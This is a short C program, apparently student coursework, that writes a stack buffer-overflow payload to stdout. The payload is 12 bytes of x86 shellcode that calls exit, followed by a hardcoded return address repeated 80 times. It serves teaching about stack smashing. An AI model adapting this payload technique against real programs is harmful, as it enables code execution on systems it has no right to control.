// Author: Jarrod Cameron (z5210220)
// Date:   16/07/19 10:55

#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <byteswap.h>

const uint8_t exit_shellcode[12] = {
  0x90, 0x31, 0xc0, 0x31, 0xdb, 0x40, 0x43, 0x43, 0x43, 0xcd,
  0x80, 0xff
};

int main (void)
{

    write(1, exit_shellcode, sizeof(exit_shellcode));

    uint32_t goal = 0xffffcfe0;
    for (int i = 0; i < 80; i++) {
        write(1, (void*)&goal, 4);
    }


    return 0;
}

